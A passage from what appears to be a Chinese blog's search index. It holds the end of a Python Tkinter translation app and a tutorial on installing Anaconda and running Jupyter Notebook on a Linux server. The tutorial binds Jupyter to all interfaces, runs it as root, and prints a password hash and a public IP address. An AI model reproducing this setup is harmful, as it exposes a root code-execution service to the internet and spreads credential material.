class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">250</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">165</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">35</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">)</span>        <span class="token comment">#翻译结果标题</span>        self<span class="token punctuation">.</span>title_label <span class="token operator">=</span> Label<span class="token punctuation">(</span>self<span class="token punctuation">.</span>window<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">u'翻译结果:'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>title_label<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">165</span><span class="token punctuation">)</span>        <span class="token comment">#翻译结果</span>        self<span class="token punctuation">.</span>result_text <span class="token operator">=</span> Text<span class="token punctuation">(</span>self<span class="token punctuation">.</span>window<span class="token punctuation">,</span>background <span class="token operator">=</span> <span class="token string">'light cyan'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>result_text<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span>y <span class="token operator">=</span> <span class="token number">190</span><span class="token punctuation">,</span>width <span class="token operator">=</span> <span class="token number">285</span><span class="token punctuation">,</span>height <span class="token operator">=</span> <span class="token number">165</span><span class="token punctuation">)</span>    <span class="token comment"># 回车翻译</span>    <span class="token keyword">def</span> <span class="token function">submit1</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#从输入框获取用户输入的值</span>        content <span class="token operator">=</span> self<span class="token punctuation">.</span>result_text1<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span>END<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>        <span class="token comment">#把这个值传送给服务器进行翻译</span>        result <span class="token operator">=</span> self<span class="token punctuation">.</span>fanyi<span class="token punctuation">.</span>crawl<span class="token punctuation">(</span>content<span class="token punctuation">)</span>        <span class="token comment">#将结果显示在窗口中的文本框中</span>        self<span class="token punctuation">.</span>result_text<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span>END<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>result_text<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>END<span class="token punctuation">,</span>result<span class="token punctuation">)</span>        <span class="token comment">#print(content)</span>    <span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#从输入框获取用户输入的值</span>        content <span class="token operator">=</span> self<span class="token punctuation">.</span>result_text1<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span>END<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>        <span class="token comment">#把这个值传送给服务器进行翻译</span>        result <span class="token operator">=</span> self<span class="token punctuation">.</span>fanyi<span class="token punctuation">.</span>crawl<span class="token punctuation">(</span>content<span class="token punctuation">)</span>        <span class="token comment">#将结果显示在窗口中的文本框中</span>        self<span class="token punctuation">.</span>result_text<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span>END<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>result_text<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>END<span class="token punctuation">,</span>result<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>        <span class="token comment">#清空文本域中的内容</span>    <span class="token keyword">def</span> <span class="token function">clean</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>result_text1<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span>END<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>result_text<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span>END<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>window<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> Application<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> web开发 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Linux服务器上搭建Python环境</title>
      <link href="/2020/10/17/%E5%9C%A8Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%90%AD%E5%BB%BAPython%E7%8E%AF%E5%A2%83/"/>
      <url>/2020/10/17/%E5%9C%A8Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%90%AD%E5%BB%BAPython%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h1 id="在服务器搭建Python环境"><a href="#在服务器搭建Python环境" class="headerlink" title="在服务器搭建Python环境"></a>在服务器搭建Python环境</h1><ol><li>先下载anaconda的环境，mkdir  anaconda建一个文件夹，然后cd  anaconda进入这个文件夹。</li><li>下载anaconda<pre class="line-numbers language-none"><code class="language-none">wget https://repo.anaconda.com/archive/Anaconda3-2019.03-Linux-x86_64.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>开始安装<pre class="line-numbers language-none"><code class="language-none">bash Anaconda3-2019.03-Linux-x86_64.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>初始化jupyter配置文件，记得保存这个配置文件的地址。<br>例如/root/.jupyter/jupyter_notebook_config.py</li><li>配置密码<br>先进入Python环境，输入ipython，然后再输入以下两端代码，并设置密码。<pre class="line-numbers language-none"><code class="language-none">from notebook.auth import passwdpasswd()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>把回执复制下来，然后输入exit()退出。</li><li>配置jupyter<br>用vim打开之前那个配置文件<pre class="line-numbers language-none"><code class="language-none">vim /root/.jupyter/jupyter_notebook_config.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>然后按i输入以下代码，输入:wq退出<pre class="line-numbers language-none"><code class="language-none">c.NotebookApp.ip='*'c.NotebookApp.password=u'sha1:d1ffce1b5f46:af2719a3e94a8c9d8e71a7646864923578    981af0'c.NotebookApp.open_browser = Falsec.NotebookApp.port=8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li>启动jupyter<pre class="line-numbers language-none"><code class="language-none">jupyter notebook --ip=0.0.0.0 --no-browser --allow-root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>保持jupyter一直运行<pre class="line-numbers language-none"><code class="language-none">nohup jupyter notebook --allow-root &gt; jupyter.log 2&gt;&amp;1 &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>最后用ip加端口就可以打开，例如<a href="http://101.37.75.132:5555。">http://101.37.75.132:5555。</a><br><strong>大功告成</strong>🤣🤣🤣😂</li></ol>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
